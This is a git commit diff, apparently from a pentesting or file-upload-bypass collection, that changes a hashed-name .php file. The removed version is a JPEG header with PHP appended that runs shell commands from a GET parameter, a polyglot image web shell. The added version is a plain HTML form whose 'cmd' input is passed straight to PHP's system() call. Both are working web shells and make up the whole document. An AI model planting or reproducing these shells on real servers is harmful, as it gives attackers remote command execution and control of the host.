6a56e8d3a18c4f5bcf43d0a89715f53ca126be22
Mai Long <117887061+longmdx@users.noreply.github.com>
2023-07-22 20:10:03 +0700

    Add files via upload

--- a712ab6b5dba5cd1d02acd56f4aac8a6.php
+++ a712ab6b5dba5cd1d02acd56f4aac8a6.php
@@ -1,17 +1,18 @@
 ЪьЪЮ JFIF  N N  Ъш C   
 
-
-		
-%# , #&')*)-0-(0%()(Ъш C   
-
-
-
-(((((((((((((((((((((((((((((((((((((((((((((((((((Ъб -4" Ъд               Ъд             Ъз    Й─                                   
-7─
-`    y=9м▌                 Дф&G4├г;К·eБ0╡Н█≥┴·ныC╙└-a2$ 
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
 <?php
-    if(isset($_GET['longmd']))
+    if(isset($_GET['cmd']))
     {
-        system($_GET['longmd']);
+        system($_GET['cmd']);
     }
 ?>
+</pre>
+</body>
+</html>
